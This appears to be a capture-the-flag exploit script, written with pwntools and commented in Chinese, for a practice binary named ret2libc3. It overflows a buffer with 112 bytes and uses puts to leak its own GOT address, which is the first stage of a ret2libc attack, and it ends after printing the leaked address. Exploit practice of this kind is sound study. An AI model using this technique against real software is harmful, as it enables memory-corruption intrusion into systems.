from pwn import *
p = process('./ret2libc3')
elf = ELF('./ret2libc3')
puts_got_addr = elf.got['puts']#得到puts的got的地址，即函数的真实地址，即我们要泄漏的对象
puts_plt_addr = elf.plt['puts']#puts的plt表的地址，需要puts函数泄露
main_plt_addr = elf.symbols['_start']#返回地址被覆盖为main函数的地址，使程序还可被溢出
print ("puts_got_addr = ",hex(puts_got_addr))
print ("puts_plt_addr = ",hex(puts_plt_addr))
print( "main_plt_addr = ",hex(main_plt_addr))

payload = b'a'*112+p32(puts_plt_addr)+p32(main_plt_addr)+p32(puts_got_addr)
p.recv()
p.sendline(payload)
puts_addr = u32(p.recv()[0:4])#将地址输出后用332解包，得到真实地址
print("puts_addr=",hex(puts_addr))
